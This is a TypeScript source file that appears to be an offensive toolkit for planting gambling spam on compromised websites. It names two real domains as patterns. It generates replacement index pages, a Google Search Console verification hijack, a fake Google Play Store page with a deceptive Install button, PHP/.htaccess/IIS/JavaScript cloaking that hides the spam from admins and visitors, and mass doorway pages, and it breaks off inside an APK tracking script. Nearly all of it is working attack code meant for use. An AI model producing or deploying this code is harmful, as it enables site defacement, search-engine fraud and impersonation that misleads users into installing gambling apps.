/**
 * ADVANCED ATTACK ENGINE — Real-World Techniques
 * Based on analysis of qec.numl.edu.pk and moenas.com attack patterns
 * 
 * 5 Advanced Techniques:
 * 1. Parasite SEO Injection — inject gambling content on high-authority domains
 * 2. Google Play Store Impersonation — fake Play Store page with APK download
 * 3. Cloaking Module — serve different content to Googlebot vs normal users
 * 4. Doorway Pages Generator — mass-create keyword-targeted pages
 * 5. APK Distribution System — deploy gambling APK with tracking pixels
 */
import { invokeLLM } from "./_core/llm";
import crypto from "crypto";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface AdvancedPayload {
  technique: string;
  type: string;
  code: string;
  description: string;
  files?: { path: string; content: string }[];
  effect?: string;
  riskLevel: number;
  stealthScore: number; // 1-10, higher = harder to detect
}

export interface AdvancedAttackResult {
  technique: string;
  targetDomain: string;
  redirectUrl: string;
  payloads: AdvancedPayload[];
  totalFiles: number;
  summary: string;
  elapsed: number;
}

export interface FullAdvancedReport {
  targetDomain: string;
  redirectUrl: string;
  techniques: AdvancedAttackResult[];
  totalPayloads: number;
  totalFiles: number;
  aiAnalysis?: string;
  elapsed: number;
}

// ═══════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════

const THAI_GAMBLING_KEYWORDS = [
  "สล็อตเว็บตรง", "สล็อต pg", "สูตรสล็อต", "เว็บสล็อต",
  "สล็อตแตกง่าย", "สล็อตแตกหนัก", "เครดิตฟรี", "สล็อต ฝาก 10 รับ 100",
  "pg slot", "สล็อต 168", "สล็อตวอเลท", "สล็อตเว็บตรง100",
  "ufabet", "สล็อต888", "สล็อตทดลองเล่น", "เว็บสล็อตแตกง่าย",
  "สล็อต ฝากถอน true wallet", "สล็อตเว็บตรง ไม่ผ่านเอเย่นต์",
  "pg ทดลองเล่น", "สล็อต joker", "สล็อต xo", "บาคาร่า",
];

const GAMBLING_TITLES = [
  "ซุปเปอร์ สล็อต เครดิตฟรี 50 ถอนได้ 300",
  "สล็อตเว็บตรง No.1 ยอดนิยมล่าสุด",
  "เว็บสล็อต ไม่ผ่านเอเย่นต์ ฝากเร็วถอนไว",
  "ทดลองเล่นสล็อตฟรีได้เงินจริง ปลอดภัย 100%",
  "สล็อตแตกหนัก โบนัสถี่ JILI",
  "PG สล็อต ระบบเสถียรและปลอดภัย",
];

const GOOGLE_PLAY_CLASSES = {
  button: "VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ nCP5yc AjY5Oe DuMIQc LQeN7",
  tab: "VfPpkd-AznF2e VfPpkd-AznF2e-OWXEXe-jJNx8e-QBLLGd WbUJNb FEsNhd",
  icon: "google-material-icons oUaal",
  container: "VfPpkd-StrnGf-rymPhb-ibnC6b",
};

const GOOGLEBOT_USER_AGENTS = [
  "Googlebot/2.1 (+http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Googlebot-Image/1.0",
  "Googlebot-News",
  "Googlebot-Video/1.0",
];

const SEARCH_BOT_PATTERNS = [
  "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
  "YandexBot", "Sogou", "facebot", "ia_archiver", "Applebot",
  "AhrefsBot", "SemrushBot", "MJ12bot", "DotBot", "PetalBot",
];

const GOOGLE_IP_RANGES = [
  "66.249.", "64.233.", "72.14.", "209.85.", "216.239.",
  "74.125.", "108.177.", "142.250.", "172.217.", "173.194.",
];

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomHex(len: number): string {
  return crypto.randomBytes(len).toString("hex").slice(0, len);
}

function slugify(text: string): string {
  return encodeURIComponent(text.replace(/\s+/g, "-"));
}

function getDomain(url: string): string {
  try {
    return new URL(url.startsWith("http") ? url : `https://${url}`).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0];
  }
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 1: PARASITE SEO INJECTION
// ═══════════════════════════════════════════════════════

export function parasiteSeoInjection(targetDomain: string, redirectUrl: string, keywords?: string[]): AdvancedAttackResult {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const kws = keywords || THAI_GAMBLING_KEYWORDS;
  const payloads: AdvancedPayload[] = [];

  // 1. Main index.html replacement with full gambling content
  const mainPageHtml = `<!DOCTYPE html>
<html lang="th-th" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="google-site-verification" content="${randomHex(43)}">
  <title>${randomChoice(kws)} ${randomChoice(GAMBLING_TITLES)}</title>
  <meta property="og:locale" content="en_TH">
  <meta property="og:type" content="website">
  <meta property="og:title" content="${randomChoice(kws)} - ${randomChoice(GAMBLING_TITLES)}">
  <meta property="og:description" content="${randomChoice(kws)} EASY AND FUN, START SOON">
  <meta property="og:url" content="/">
  <meta property="og:site_name" content="${randomChoice(kws)}">
  <meta property="og:image" content="https://tse-mm.bing.com/th?q=${encodeURIComponent(randomChoice(kws))}&w=200&h=200&c=7">
  <link rel="canonical" href="https://${domain}/">
  <style>
    body { font-family: 'Prompt', sans-serif; background: #1a1a2e; color: #fff; margin: 0; }
    .hero { text-align: center; padding: 60px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
    .hero h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
    .cta-btn { display: inline-block; padding: 15px 40px; background: #ffd700; color: #1a1a2e; font-size: 1.2em; font-weight: bold; border-radius: 50px; text-decoration: none; }
    .content { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
    .card { background: #16213e; border-radius: 12px; padding: 20px; }
    .card h3 { color: #ffd700; }
    .footer-links { font-size: 1px; color: transparent; overflow: hidden; height: 1px; }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="hero">
    <h1>🔥 ${randomChoice(kws)} 🔥</h1>
    <p>${randomChoice(GAMBLING_TITLES)}</p>
    <a href="${redirectUrl}" class="cta-btn">สมัครเลย รับเครดิตฟรี</a>
  </div>
  <div class="content">
    <div class="grid">
      ${kws.slice(0, 6).map(kw => `<div class="card"><h3>${kw}</h3><p>เพลิดเพลินไปกับระบบฝาก-ถอนออโต้ที่สะดวกและรวดเร็ว ทุกการฝากและถอนทำได้ในไม่กี่วินาที!</p><a href="/${slugify(kw)}/" style="color:#ffd700">อ่านเพิ่มเติม →</a></div>`).join("\n      ")}
    </div>
  </div>
  <div class="footer-links">
    ${kws.map(kw => `<a href="/${slugify(kw)}/">${kw}</a>`).join(" ")}
  </div>
  <script>
    // Track clicks
    document.querySelectorAll('a[href*="${getDomain(redirectUrl)}"]').forEach(a => {
      a.addEventListener('click', () => {
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
          navigator.sendBeacon('/track', JSON.stringify({ip:d.ip,page:location.pathname,ts:Date.now()}));
        });
      });
    });
  </script>
</body>
</html>`;

  payloads.push({
    technique: "parasite_seo",
    type: "main_page_injection",
    code: mainPageHtml,
    description: "Full gambling content page injected as main index — replaces original site content with Thai gambling/slot content",
    files: [{ path: "index.html", content: mainPageHtml }],
    effect: "Leverages high-authority domain DA/DR to rank gambling keywords on Google",
    riskLevel: 9,
    stealthScore: 5,
  });

  // 2. Google Site Verification injection
  const gsvCode = `google-site-verification: google${randomHex(16)}.html`;
  payloads.push({
    technique: "parasite_seo",
    type: "google_verification_hijack",
    code: gsvCode,
    description: "Inject Google Site Verification file to claim ownership in GSC — enables sitemap submission and index control",
    files: [{ path: `google${randomHex(16)}.html`, content: gsvCode }],
    effect: "Attacker gains Google Search Console access for the domain",
    riskLevel: 10,
    stealthScore: 8,
  });

  // 3. Sitemap with all spam pages
  const sitemapXml = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
${kws.map(kw => `  <url>
    <loc>https://${domain}/${slugify(kw)}/</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.9</priority>
  </url>`).join("\n")}
</urlset>`;

  payloads.push({
    technique: "parasite_seo",
    type: "sitemap_injection",
    code: sitemapXml,
    description: "Inject sitemap.xml with all gambling doorway pages for rapid Google indexing",
    files: [{ path: "sitemap.xml", content: sitemapXml }],
    effect: "Google discovers and indexes all spam pages within hours",
    riskLevel: 8,
    stealthScore: 6,
  });

  // 4. robots.txt allowing all bots
  const robotsTxt = `User-agent: *
Allow: /
Sitemap: https://${domain}/sitemap.xml`;

  payloads.push({
    technique: "parasite_seo",
    type: "robots_txt_override",
    code: robotsTxt,
    description: "Override robots.txt to allow all crawlers and point to spam sitemap",
    files: [{ path: "robots.txt", content: robotsTxt }],
    effect: "Ensures all search engines can crawl and index spam content",
    riskLevel: 5,
    stealthScore: 9,
  });

  const totalFiles = payloads.reduce((sum, p) => sum + (p.files?.length || 0), 0);
  return {
    technique: "parasite_seo_injection",
    targetDomain: domain,
    redirectUrl,
    payloads,
    totalFiles,
    summary: `Parasite SEO: ${payloads.length} payloads, ${totalFiles} files — ฝังเนื้อหาพนันบน ${domain} ใช้ DA/DR ดัน ranking`,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 2: GOOGLE PLAY STORE IMPERSONATION
// ═══════════════════════════════════════════════════════

export function googlePlayImpersonation(targetDomain: string, redirectUrl: string, appName?: string): AdvancedAttackResult {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const name = appName || randomChoice(THAI_GAMBLING_KEYWORDS);
  const payloads: AdvancedPayload[] = [];

  const playStoreHtml = `<!DOCTYPE html>
<html lang="th-th" dir="ltr" class="translated-ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="google-site-verification" content="${randomHex(43)}">
  <link rel="search" href="https://googleplay.com/opensearch.xml" type="application/opensearchdescription+xml" title="Google Play">
  <title>${name} - Apps on Google Play</title>
  <meta property="og:title" content="${name} - Apps on Google Play">
  <meta property="og:description" content="${name} EASY AND FUN, START SOON">
  <meta property="og:image" content="https://tse-mm.bing.com/th?q=${encodeURIComponent(name)}&w=200&h=200&c=7">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; }
    .header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 12px 24px; display: flex; align-items: center; gap: 16px; }
    .header img { height: 30px; }
    .header input { flex: 1; padding: 8px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
    .app-header { padding: 24px; display: flex; gap: 24px; max-width: 1200px; margin: 0 auto; }
    .app-icon { width: 180px; height: 180px; border-radius: 28px; object-fit: cover; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
    .app-info h1 { font-size: 28px; font-weight: 500; margin-bottom: 8px; }
    .app-info .developer { color: #01875f; font-size: 14px; font-weight: 500; }
    .app-info .meta { color: #5f6368; font-size: 12px; margin: 8px 0; }
    .install-btn { display: inline-block; padding: 12px 32px; background: #01875f; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 16px; }
    .install-btn:hover { background: #016d4e; }
    .screenshots { display: flex; gap: 12px; padding: 24px; overflow-x: auto; max-width: 1200px; margin: 0 auto; }
    .screenshots img { height: 350px; border-radius: 12px; }
    .tabs { display: flex; border-bottom: 2px solid #e0e0e0; max-width: 1200px; margin: 0 auto; padding: 0 24px; }
    .tab { padding: 12px 24px; color: #5f6368; font-size: 14px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
    .tab.active { color: #01875f; border-bottom-color: #01875f; }
    .description { max-width: 1200px; margin: 0 auto; padding: 24px; line-height: 1.8; color: #333; }
    .rating { display: flex; align-items: center; gap: 8px; margin: 12px 0; }
    .stars { color: #ffd700; font-size: 18px; }
    .rating-num { font-size: 48px; font-weight: 300; }
    .footer { background: #f8f9fa; padding: 24px; text-align: center; color: #5f6368; font-size: 12px; margin-top: 40px; }
  </style>
</head>
<body>
  <div class="header">
    <svg width="30" height="30" viewBox="0 0 24 24"><path fill="#4285f4" d="M3.18 23.49L12 14.67l-3.54-3.54L1 18.49c-.38.38-.59.88-.59 1.41 0 1.1.9 2 2 2 .53 0 1.04-.21 1.41-.59l.36-.36z"/><path fill="#34a853" d="M12 14.67l8.82 8.82c.38.38.88.59 1.41.59 1.1 0 2-.9 2-2 0-.53-.21-1.04-.59-1.41L16.54 13.6 12 14.67z"/><path fill="#ea4335" d="M1 5.51l7.46 7.46L12 9.43 4.18.49C3.8.11 3.3-.1 2.77-.1c-1.1 0-2 .9-2 2 0 .53.21 1.04.59 1.41L1 5.51z"/><path fill="#fbbc04" d="M20.82.49L12 9.43l4.54 3.54 7.46-7.46c.38-.38.59-.88.59-1.41 0-1.1-.9-2-2-2-.53 0-1.04.21-1.41.59l-.36.36z"/></svg>
    <input type="text" placeholder="Search for apps & games" value="${name}">
  </div>
  
  <div class="app-header">
    <img class="app-icon" src="https://tse-mm.bing.com/th?q=${encodeURIComponent(name)}&w=200&h=200&c=7" alt="${name}">
    <div class="app-info">
      <h1>${name}</h1>
      <div class="developer">${name} Official</div>
      <div class="meta">Contains ads · In-app purchases</div>
      <div class="rating">
        <span class="rating-num">4.${randomInt(5, 9)}</span>
        <span class="stars">★★★★★</span>
        <span style="color:#5f6368; font-size:12px">${randomInt(10, 99)}K reviews</span>
      </div>
      <div class="meta">${randomInt(1, 10)}M+ Downloads · Everyone</div>
      <button class="install-btn" id="installButton" onclick="handleInstall()">Install</button>
    </div>
  </div>

  <div class="tabs">
    <div class="tab active">About this app</div>
    <div class="tab">Reviews</div>
    <div class="tab">Similar</div>
  </div>

  <div class="description">
    <h2>About this app</h2>
    <p>🔥 ${name} — ${randomChoice(GAMBLING_TITLES)}</p>
    <p>เพลิดเพลินไปกับระบบฝาก-ถอนออโต้ที่สะดวกและรวดเร็ว ทุกการฝากและถอนทำได้ในไม่กี่วินาที! ระบบเสถียรและปลอดภัย!</p>
    <br>
    <p>✅ สล็อตเว็บตรง ไม่ผ่านเอเย่นต์</p>
    <p>✅ ฝากเร็วถอนไว ไม่มีขั้นต่ำ</p>
    <p>✅ เล่นจริงจ่ายจริง ปลอดภัยไม่ล้อคยูส</p>
    <p>✅ รองรับ True Wallet ทุกธนาคาร</p>
  </div>

  <div class="screenshots">
    ${[1,2,3,4,5].map(i => `<img src="https://tse-mm.bing.com/th?q=${encodeURIComponent(name)}+game+screenshot+${i}&w=200&h=400&c=7" alt="Screenshot ${i}">`).join("\n    ")}
  </div>

  <div class="footer">
    <a href="https://policies.google.com/privacy">Privacy Policy</a> · 
    <a href="https://myaccount.google.com/termsofservice">Terms of Service</a>
  </div>

  <script>
    var downUrl = "${redirectUrl}";
    function handleInstall() {
      // Track install click
      try {
        var img = new Image(1,1);
        img.src = "https://www.facebook.com/tr?id=${randomInt(100000000, 999999999)}&ev=Lead&noscript=1";
      } catch(e) {}
      // Redirect to gambling site
      window.location.href = downUrl;
    }
  </script>
</body>
</html>`;

  payloads.push({
    technique: "play_store_impersonation",
    type: "fake_play_store_page",
    code: playStoreHtml,
    description: "Full Google Play Store impersonation page — mimics Play Store UI with Install button that redirects to gambling site",
    files: [{ path: "index.html", content: playStoreHtml }],
    effect: "Users think they're on Google Play and click Install → redirected to gambling site + APK download",
    riskLevel: 9,
    stealthScore: 7,
  });

  // App listing pages for different keywords
  for (const kw of THAI_GAMBLING_KEYWORDS.slice(0, 8)) {
    const listingHtml = playStoreHtml
      .replace(new RegExp(name, "g"), kw)
      .replace(/<title>.*<\/title>/, `<title>${kw} - Apps on Google Play</title>`);
    
    payloads.push({
      technique: "play_store_impersonation",
      type: "keyword_app_listing",
      code: `<!-- App listing for: ${kw} -->`,
      description: `Fake Play Store listing targeting keyword: ${kw}`,
      files: [{ path: `${slugify(kw)}/index.html`, content: listingHtml }],
      effect: `Ranks for "${kw}" on Google with Play Store-like appearance`,
      riskLevel: 8,
      stealthScore: 7,
    });
  }

  const totalFiles = payloads.reduce((sum, p) => sum + (p.files?.length || 0), 0);
  return {
    technique: "google_play_impersonation",
    targetDomain: domain,
    redirectUrl,
    payloads,
    totalFiles,
    summary: `Play Store Impersonation: ${payloads.length} payloads, ${totalFiles} files — หน้าเลียนแบบ Google Play + ปุ่ม Install → ${getDomain(redirectUrl)}`,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 3: CLOAKING MODULE
// ═══════════════════════════════════════════════════════

export function cloakingModule(targetDomain: string, redirectUrl: string): AdvancedAttackResult {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const payloads: AdvancedPayload[] = [];

  // PHP User-Agent cloaking
  const phpCloaking = `<?php
/**
 * Advanced Cloaking Module
 * Shows gambling content to search bots, normal site to users
 */
function isSearchBot() {
    \$ua = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
    \$botPatterns = [${SEARCH_BOT_PATTERNS.map(b => `'${b.toLowerCase()}'`).join(", ")}];
    foreach (\$botPatterns as \$bot) {
        if (strpos(\$ua, \$bot) !== false) return true;
    }
    // Also check IP ranges for Google
    \$ip = \$_SERVER['REMOTE_ADDR'] ?? '';
    \$googleRanges = [${GOOGLE_IP_RANGES.map(r => `'${r}'`).join(", ")}];
    foreach (\$googleRanges as \$range) {
        if (strpos(\$ip, \$range) === 0) return true;
    }
    // Check for reverse DNS verification
    \$host = @gethostbyaddr(\$ip);
    if (\$host && (strpos(\$host, '.googlebot.com') !== false || strpos(\$host, '.google.com') !== false)) {
        return true;
    }
    return false;
}

function isAdmin() {
    return isset(\$_COOKIE['_admin_bypass']) && \$_COOKIE['_admin_bypass'] === '${randomHex(32)}';
}

if (isAdmin()) {
    // Admin sees original site
    return;
}

if (isSearchBot()) {
    // Serve gambling content to bots
    include __DIR__ . '/spam-content.html';
    exit;
} else {
    // Normal users get redirected or see original
    // Option 1: Show original site (stealth mode)
    // Option 2: Redirect to gambling site
    \$hour = (int)date('G');
    if (\$hour >= 20 || \$hour < 8) {
        // Night time: redirect mobile users
        if (preg_match('/Android|iPhone|iPad|Mobile/i', \$_SERVER['HTTP_USER_AGENT'] ?? '')) {
            header("Location: ${redirectUrl}", true, 302);
            exit;
        }
    }
}
?>`;

  payloads.push({
    technique: "cloaking",
    type: "php_ua_cloaking",
    code: phpCloaking,
    description: "PHP User-Agent + IP-based cloaking — Googlebot sees gambling content, users see original site or get redirected at night",
    files: [{ path: "cloak.php", content: phpCloaking }],
    effect: "Google indexes gambling content while site appears normal to visitors and admins",
    riskLevel: 9,
    stealthScore: 9,
  });

  // .htaccess cloaking for Apache
  const htaccessCloaking = `# Performance optimization module
RewriteEngine On

# Bot detection and content serving
RewriteCond %{HTTP_USER_AGENT} (Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|facebot|Applebot) [NC]
RewriteRule ^(.*)$ /spam-content/$1 [L]

# IP-based bot detection (Google IP ranges)
RewriteCond %{REMOTE_ADDR} ^66\\.249\\.
RewriteRule ^(.*)$ /spam-content/$1 [L]
RewriteCond %{REMOTE_ADDR} ^64\\.233\\.
RewriteRule ^(.*)$ /spam-content/$1 [L]
RewriteCond %{REMOTE_ADDR} ^209\\.85\\.
RewriteRule ^(.*)$ /spam-content/$1 [L]
RewriteCond %{REMOTE_ADDR} ^142\\.250\\.
RewriteRule ^(.*)$ /spam-content/$1 [L]

# Referrer-based cloaking (from Google search results)
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo)\\.com [NC]
RewriteRule ^(.*)$ /spam-content/$1 [L]`;

  payloads.push({
    technique: "cloaking",
    type: "htaccess_cloaking",
    code: htaccessCloaking,
    description: ".htaccess rewrite rules for Apache — routes bot traffic and Google referral traffic to spam content directory",
    files: [{ path: ".htaccess", content: htaccessCloaking }],
    effect: "All search bot traffic sees spam content, direct visitors see original site",
    riskLevel: 8,
    stealthScore: 8,
  });

  // IIS web.config cloaking (for ASP.NET servers like qec.numl.edu.pk)
  const webConfigCloaking = `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <rewrite>
      <rules>
        <rule name="BotCloak" stopProcessing="true">
          <match url="(.*)" />
          <conditions logicalGrouping="MatchAny">
            <add input="{HTTP_USER_AGENT}" pattern="(Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot)" />
            <add input="{REMOTE_ADDR}" pattern="^66\\.249\\." />
            <add input="{REMOTE_ADDR}" pattern="^64\\.233\\." />
            <add input="{REMOTE_ADDR}" pattern="^142\\.250\\." />
          </conditions>
          <action type="Rewrite" url="/spam-content/{R:1}" />
        </rule>
      </rules>
    </rewrite>
  </system.webServer>
</configuration>`;

  payloads.push({
    technique: "cloaking",
    type: "iis_webconfig_cloaking",
    code: webConfigCloaking,
    description: "IIS web.config URL Rewrite rules — same cloaking logic for Windows/IIS/ASP.NET servers",
    files: [{ path: "web.config", content: webConfigCloaking }],
    effect: "Cloaking on IIS servers (like qec.numl.edu.pk pattern)",
    riskLevel: 8,
    stealthScore: 8,
  });

  // JavaScript-based cloaking (client-side)
  const jsCloaking = `<script>
(function(){
  // Client-side cloaking: detect if page is being rendered by bot
  var isBot = false;
  
  // Check for headless browser indicators
  if (navigator.webdriver) isBot = true;
  if (!window.chrome && /Chrome/.test(navigator.userAgent)) isBot = true;
  if (navigator.languages && navigator.languages.length === 0) isBot = true;
  if (!navigator.plugins || navigator.plugins.length === 0) isBot = true;
  
  // Check for Google cache viewing
  if (document.referrer.includes('webcache.googleusercontent.com')) isBot = true;
  if (window.location.href.includes('cache:')) isBot = true;
  
  if (!isBot) {
    // Real user: redirect to gambling site (with delay for stealth)
    setTimeout(function() {
      if (document.referrer.includes('google.') || document.referrer.includes('bing.')) {
        window.location.replace('${redirectUrl}');
      }
    }, 1500);
  }
  // If bot: do nothing, let them see the spam content for indexing
})();
</script>`;

  payloads.push({
    technique: "cloaking",
    type: "js_client_cloaking",
    code: jsCloaking,
    description: "Client-side JavaScript cloaking — detects real users vs bots, redirects real users from Google to gambling site",
    files: [{ path: "assets/analytics.js", content: jsCloaking }],
    effect: "Bots index spam content, real users from Google search get redirected to gambling site",
    riskLevel: 7,
    stealthScore: 6,
  });

  const totalFiles = payloads.reduce((sum, p) => sum + (p.files?.length || 0), 0);
  return {
    technique: "cloaking_module",
    targetDomain: domain,
    redirectUrl,
    payloads,
    totalFiles,
    summary: `Cloaking: ${payloads.length} payloads — PHP/Apache/IIS/JS cloaking ให้ Googlebot เห็นเนื้อหาพนัน user ปกติเห็นเว็บเดิม`,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 4: DOORWAY PAGES GENERATOR
// ═══════════════════════════════════════════════════════

export function doorwayPagesGenerator(targetDomain: string, redirectUrl: string, count?: number, keywords?: string[]): AdvancedAttackResult {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const kws = keywords || THAI_GAMBLING_KEYWORDS;
  const pageCount = count || 50;
  const payloads: AdvancedPayload[] = [];

  // Generate doorway pages for each keyword
  const generatedPages: { path: string; content: string }[] = [];

  for (let i = 0; i < Math.min(pageCount, kws.length * 3); i++) {
    const kw = kws[i % kws.length];
    const title = `${kw} ${randomChoice(GAMBLING_TITLES)}`;
    const slug = slugify(kw);
    const variant = i >= kws.length ? `-${Math.floor(i / kws.length)}` : "";
    
    // Mix of URL patterns (mimicking qec.numl.edu.pk)
    let filePath: string;
    const pathType = i % 5;
    switch (pathType) {
      case 0: filePath = `${slug}${variant}/index.html`; break;
      case 1: filePath = `${slug}${variant}.aspx`; break;
      case 2: filePath = `store/apps/${slug}${variant}/index.html`; break;
      case 3: filePath = `${slug.toLowerCase()}${variant}.html`; break;
      default: filePath = `pages/${slug}${variant}/index.html`; break;
    }

    const pageHtml = `<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${title}</title>
  <meta name="description" content="${kw} — สล็อตเว็บตรง No.1 ยอดนิยมล่าสุด รองรับการฝากถอนผ่านทรูวอเลท">
  <meta property="og:title" content="${title}">
  <meta property="og:description" content="${kw} EASY AND FUN">
  <meta property="og:image" content="https://tse-mm.bing.com/th?q=${encodeURIComponent(kw)}&w=200&h=200&c=7">
  <link rel="canonical" href="https://${domain}/${filePath.replace('/index.html', '/')}">
  <style>
    body { font-family: 'Prompt', sans-serif; background: #0f0f23; color: #e0e0e0; margin: 0; padding: 0; }
    .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
    h1 { color: #ffd700; font-size: 2em; text-align: center; margin-bottom: 30px; }
    .cta { display: block; text-align: center; padding: 18px; background: linear-gradient(135deg, #ff6b35, #f7c948); color: #000; font-size: 1.3em; font-weight: bold; text-decoration: none; border-radius: 12px; margin: 30px 0; }
    .content { line-height: 2; font-size: 16px; }
    .internal-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 30px; }
    .internal-links a { color: #4fc3f7; text-decoration: none; padding: 8px; background: #1a1a3e; border-radius: 8px; text-align: center; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎰 ${kw} 🎰</h1>
    <a href="${redirectUrl}" class="cta">🔥 สมัครเลย รับเครดิตฟรี 50 ถอนได้ 300 🔥</a>
    <div class="content">
      <p>${kw} is เพลิดเพลินไปกับระบบฝาก-ถอนออโต้ที่สะดวกและรวดเร็ว ทุกการฝากและถอนทำได้ในไม่กี่วินาที!</p>
      <p>สนุกได้ไม่มีเบื่อ! ระบบเสถียรและปลอดภัย! ระบบฝาก-ถอนออโต้ที่รวดเร็วที่สุดใน PG สล็อต!</p>
      <p>✅ สล็อตเว็บตรง ไม่ผ่านเอเย่นต์ ✅ ฝากเร็วถอนไว ไม่มีขั้นต่ำ ✅ เล่นจริงจ่ายจริง ปลอดภัยไม่ล้อคยูส</p>
    </div>
    <a href="${redirectUrl}" class="cta">สมัครสมาชิก →</a>
    <div class="internal-links">
      ${kws.filter(k => k !== kw).slice(0, 8).map(k => `<a href="/${slugify(k)}/">${k}</a>`).join("\n      ")}
    </div>
  </div>
  <script>
    // Auto-redirect from Google search after 3 seconds
    if (document.referrer.match(/google|bing|yahoo/i)) {
      setTimeout(function() { window.location.replace('${redirectUrl}'); }, 3000);
    }
  </script>
</body>
</html>`;

    generatedPages.push({ path: filePath, content: pageHtml });
  }

  payloads.push({
    technique: "doorway_pages",
    type: "mass_doorway_generation",
    code: `<!-- ${generatedPages.length} doorway pages generated targeting ${kws.length} keywords -->`,
    description: `Mass doorway page generation: ${generatedPages.length} pages targeting Thai gambling keywords with mixed URL patterns (.html, .aspx, /store/, /pages/)`,
    files: generatedPages,
    effect: `${generatedPages.length} pages indexed on Google, each targeting different gambling keywords using ${domain} authority`,
    riskLevel: 8,
    stealthScore: 5,
  });

  // Internal linking structure
  const linkMapJs = `// Internal link map for SEO juice distribution
const pages = ${JSON.stringify(generatedPages.map(p => "/" + p.path.replace("/index.html", "/")))};
document.querySelectorAll('.internal-links').forEach(el => {
  const links = pages.sort(() => Math.random() - 0.5).slice(0, 8);
  el.innerHTML = links.map(l => '<a href="' + l + '">' + decodeURIComponent(l.replace(/\\//g, '').replace(/-/g, ' ')) + '</a>').join('');
});`;

  payloads.push({
    technique: "doorway_pages",
    type: "internal_linking_network",
    code: linkMapJs,
    description: "Internal linking JavaScript — creates cross-links between all doorway pages to distribute PageRank",
    files: [{ path: "assets/links.js", content: linkMapJs }],
    effect: "All doorway pages interlink, creating a strong internal link network for SEO",
    riskLevel: 6,
    stealthScore: 7,
  });

  const totalFiles = payloads.reduce((sum, p) => sum + (p.files?.length || 0), 0);
  return {
    technique: "doorway_pages_generator",
    targetDomain: domain,
    redirectUrl,
    payloads,
    totalFiles,
    summary: `Doorway Pages: ${generatedPages.length} pages สร้างแล้ว — target ${kws.length} keywords + internal linking network`,
    elapsed: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 5: APK DISTRIBUTION SYSTEM
// ═══════════════════════════════════════════════════════

export function apkDistribution(targetDomain: string, redirectUrl: string, appName?: string): AdvancedAttackResult {
  const start = Date.now();
  const domain = getDomain(targetDomain);
  const name = appName || randomChoice(THAI_GAMBLING_KEYWORDS);
  const payloads: AdvancedPayload[] = [];

  // AppsFlyer Smart Script for attribution tracking
  const appsFlyerScript = `// AppsFlyer Smart Script — Track app installs from web
(function() {
  var AF_SMART_SCRIPT = {
    version: "3.5.2",
    oneLinkURL: "${redirectUrl}",
    afParameters: {
      mediaSource: { keys: ["utm_source"], defaultValue: "organic" },
      campaign: { keys: ["utm_campaign"], defaultValue: "seo_parasite" },
      channel: { keys: ["utm_medium"], defaultValue: "web" },
      adSet: { keys: ["utm_content"], defaultValue: "${domain}" },
    }
  };
  
  // Track page view
  var img = new Image(1,1);
  img.src = "https://impression.appsflyer.com/app.gambling?pid=seo&c=${domain}&af_siteid=" + encodeURIComponent(window.location.href);
  
  // Smart banner for mobile
